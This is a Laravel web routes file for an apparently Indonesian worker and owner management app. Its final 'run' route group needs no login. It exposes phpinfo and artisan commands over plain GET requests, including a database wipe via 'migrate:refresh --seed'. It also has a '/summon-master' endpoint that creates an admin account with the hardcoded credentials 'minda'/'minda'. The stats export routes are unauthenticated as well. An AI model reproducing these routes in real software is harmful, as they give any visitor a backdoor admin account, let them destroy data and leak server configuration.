<?php

use App\Models\User;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('welcome');
});

Route::middleware('guest')->group(function () {
    Route::match(['GET', 'POST'], '/login', [App\Http\Controllers\Auth\AuthController::class, 'login'])->name('login');
    // Route::match(['GET', 'POST'], '/register', [App\Http\Controllers\Auth\AuthController::class, 'register'])->name('register');
    Route::match(['GET', 'POST'], '/register-owner', [App\Http\Controllers\Auth\AuthController::class, 'registerOwner'])->name('register-owner');
});

Route::get('/get-all-stats', [App\Http\Controllers\StatsController::class, 'getAllStats'])->name('getallstats');
Route::get('/download-all-stats', [App\Http\Controllers\StatsController::class, 'exportPDF'])->name('downloadallstats');

// Authenticated Users / Admin
Route::middleware('auth')->group(function () {
    Route::get('/dashboard', [App\Http\Controllers\DashboardController::class, 'index'])->name('dashboard');
    Route::get('/stats', [App\Http\Controllers\StatsController::class, 'index'])->name('stats');
    Route::get('/settings', [App\Http\Controllers\SettingsController::class, 'index'])->name('settings');

    Route::get('/datapekerjadanowner', [App\Http\Controllers\DashboardController::class, 'dataPekerjaDanOwner'])->name('datapekerjadanowner');
    Route::post('/deletepekerjadanowner', [App\Http\Controllers\DashboardController::class, 'deletePekerjaDanOwner'])->name('deletepekerjadanowner');
    Route::post('/ubahusername', [App\Http\Controllers\DashboardController::class, 'ubahUsername'])->name('ubahusername');
    Route::post('/resetpasswordfromadmin', [App\Http\Controllers\DashboardController::class, 'resetPassword'])->name('resetpasswordfromadmin');
    Route::post('/tambahownerfromadmin', [App\Http\Controllers\DashboardController::class, 'tambahOwnerFromAdmin'])->name('tambahownerfromadmin');
    Route::post('/tambahpekerjafromadmin', [App\Http\Controllers\DashboardController::class, 'tambahPekerjaFromAdmin'])->name('tambahpekerjafromadmin');

    // update machine id bound (bound or unbound)
    Route::post('/bond', [App\Http\Controllers\SettingsController::class, 'updateBond'])->name('bond');
    // change password
    Route::post('/changepassword', [App\Http\Controllers\SettingsController::class, 'changePassword'])->name('changepassword');
    // delete machine id
    Route::post('/addmachineid', [App\Http\Controllers\SettingsController::class, 'addMachineId'])->name('addmachineid');
    // delete machine id
    Route::post('/deletemachineid', [App\Http\Controllers\SettingsController::class, 'deletemachineid'])->name('deletemachineid');

    Route::post('/registerpekerjafromowner', [App\Http\Controllers\SettingsController::class, 'registerPekerjaFromOwner'])->name('registerpekerjafromowner');

    Route::post('/resetpasswordpekerja', [App\Http\Controllers\SettingsController::class, 'resetPasswordPekerja'])->name('resetpasswordpekerja');

    Route::post('/deletepekerja', [App\Http\Controllers\SettingsController::class, 'deletePekerja'])->name('deletepekerja');

    Route::get('/logout', [App\Http\Controllers\Auth\AuthController::class, 'logout'])->name('logout');
});

// run command from route
Route::prefix('run')->group(function () {
    // show php info
    Route::get('/phpinfo', function () {
        dd(phpinfo());
    });
    // cache route
    Route::get('/cache-route', function () {
        Artisan::call('route:cache');
        dd(Artisan::output());
    });
    // cache config
    Route::get('/cache-config', function () {
        Artisan::call('config:cache');
        dd(Artisan::output());
    });
    // optimize
    Route::get('/optimize', function () {
        Artisan::call('optimize');
        dd(Artisan::output());
    });
    // migrate refresh seed
    Route::get('/reset-seed-database', function () {
        Artisan::call('migrate:refresh --seed');
        dd(Artisan::output());
    });
    Route::get('/seed-stats', function () {
        Artisan::call('db:seed --class=StatSeeder');
        dd(Artisan::output());
    });

    Route::get('/summon-master', function () {
        try {
            User::create([
                'username' => 'minda',
                'password' => 'minda',
                'role' => 'admin'
            ]);
            dd('summoned');
        } catch (\Throwable $th) {
            dd('already created');
        }
    });
    Route::get('/release-master', function () {
        User::where('username', 'minda')
        ->where('role', 'admin')
        ->delete();
        dd('released');
    });
});
